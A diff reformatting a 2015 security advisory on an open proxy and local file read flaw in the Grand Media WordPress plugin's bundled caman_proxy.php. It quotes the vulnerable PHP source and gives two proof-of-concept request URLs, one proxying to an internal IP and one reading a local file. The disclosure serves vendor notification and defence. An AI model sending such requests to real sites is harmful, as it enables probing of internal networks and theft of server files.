@@ -1,44 +1,53 @@
-                                Advisory #: 122
-Title: Grand Media v1.6.4 Wordpress Plugin open proxy [previous discovery by
-Chad Seaman]
-Author:Larry W. Cashdollar, @_larry0
-Date: 2015-06-01
-Download Site: https://wordpress.org/plugins/grand-media/_https://github.com/
-meltingice/CamanJS/blob/master/proxies/caman_proxy.php
-Vendor:http://codeasily.com/ https://github.com/meltingice/CamanJS/blob/master/
-proxies/caman_proxy.php
-Vendor Notified: 2015-06-01
-Vendor Contact: Contact Page on website
-Description: Gmedia Gallery is a fully integrated Image, Music, Video Gallery
-WordPress plugin with a powerful admin panel.
-Vulnerability:
-grand-media/assets/image-editor/camanjs/proxies/caman_proxy.php It uses
-readfile, which I’d like to explore abusing. So it’s an open proxy for any
-image file, but can also read image files off of the local file system. http://
-www.vapidlabs.com/wp-content/plugins/grand-media/assets/image-editor/camanjs/
-proxies/caman_proxy.php?camanProxyUrl=http://192.168.0.2/banner3.jpeg 4 define
-('ALLOW_NO_EXT', false); <-- if administrator changes this to true remote
-attacker can download sensitive local system files. 5 6 $proxyParam =
-'camanProxyUrl'; 7 8 if (!$_GET[$proxyParam]) { 9 exit; 10 } 11 12 // Grab the
-URL 13 $url = trim(urldecode($_GET[$proxyParam])); 14 15 //echo $url; 16 17
-$urlinfo = parse_url($url, PHP_URL_PATH); 18 $ext = array_reverse(explode(".",
-$urlinfo)); 19 20 $ctype = null; 21 switch ($ext[0]) { 22 case 'gif': $ctype =
-'image/gif'; break; 23 case 'png': $ctype = 'image/png'; break; 24 case 'jpeg':
-25 case 'jpg': $ctype = 'image/jpg'; break; 26 default: 27 if (ALLOW_NO_EXT)
-{ 28 $ctype = 'application/octet-stream'; 29 } else { 30 exit; 31 } 32 } 33 34
-35 // Route the image through this script 36 header("Content-Type: $ctype"); 37
-readfile($url);
-CVE-TBD
-JSON:Export
-Exploit Code:
-   1. Open Proxy:
-   2. http://www.vapidlabs.com/wp-content/plugins/grand-media/assets/image-
-      editor/camanjs/proxies/caman_proxy.php?camanProxyUrl=http://192.168.0.2/
-      banner3.jpeg
-   3.  
-   4. Local Image Files:
-   5. http://www.vapidlabs.com/wp-content/plugins/grand-media/assets/image-
-      editor/camanjs/proxies/caman_proxy.php?camanProxyUrl=/tmp/loader.gif
-   6.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisory.php?v=122
+
+                               Advisory #: 122
+
+   Title: Grand Media v1.6.4 Wordpress Plugin open proxy [previous
+   discovery by Chad Seaman]
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2015-06-01
+   Download Site: https://wordpress.org/plugins/grand-media/
+   https://github.com/meltingice/CamanJS/blob/master/proxies/caman_proxy.p
+   hp
+   Vendor: http://codeasily.com/
+   https://github.com/meltingice/CamanJS/blob/master/proxies/caman_proxy.p
+   hp
+   Vendor Notified: 2015-06-01
+   Vendor Contact: Contact Page on website
+   Description: Gmedia Gallery is a fully integrated Image, Music, Video
+   Gallery WordPress plugin with a powerful admin panel.
+   Vulnerability:
+   grand-media/assets/image-editor/camanjs/proxies/caman_proxy.php It uses
+   readfile, which I’d like to explore abusing. So it’s an open proxy for
+   any image file, but can also read image files off of the local file
+   system.
+   http://www.vapidlabs.com/wp-content/plugins/grand-media/assets/image-ed
+   itor/camanjs/proxies/caman_proxy.php?camanProxyUrl=http://192.168.0.2/b
+   anner3.jpeg 4 define('ALLOW_NO_EXT', false); <-- if administrator
+   changes this to true remote attacker can download sensitive local
+   system files. 5 6 $proxyParam = 'camanProxyUrl'; 7 8 if
+   (!$_GET[$proxyParam]) { 9 exit; 10 } 11 12 // Grab the URL 13 $url =
+   trim(urldecode($_GET[$proxyParam])); 14 15 //echo $url; 16 17 $urlinfo
+   = parse_url($url, PHP_URL_PATH); 18 $ext = array_reverse(explode(".",
+   $urlinfo)); 19 20 $ctype = null; 21 switch ($ext[0]) { 22 case 'gif':
+   $ctype = 'image/gif'; break; 23 case 'png': $ctype = 'image/png';
+   break; 24 case 'jpeg': 25 case 'jpg': $ctype = 'image/jpg'; break; 26
+   default: 27 if (ALLOW_NO_EXT) { 28 $ctype = 'application/octet-stream';
+   29 } else { 30 exit; 31 } 32 } 33 34 35 // Route the image through this
+   script 36 header("Content-Type: $ctype"); 37 readfile($url);
+   CVE-TBD
+   JSON: Export
+   Exploit Code:
+
+    1. Open Proxy:
+    2. http://www.vapidlabs.com/wp-content/plugins/grand-media/assets/imag
+       e-editor/camanjs/proxies/caman_proxy.php?camanProxyUrl=http://192.1
+       68.0.2/banner3.jpeg
+    3.
+    4. Local Image Files:
+    5. http://www.vapidlabs.com/wp-content/plugins/grand-media/assets/imag
+       e-editor/camanjs/proxies/caman_proxy.php?camanProxyUrl=/tmp/loader.
+       gif
+    6.
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisory.php?v=122
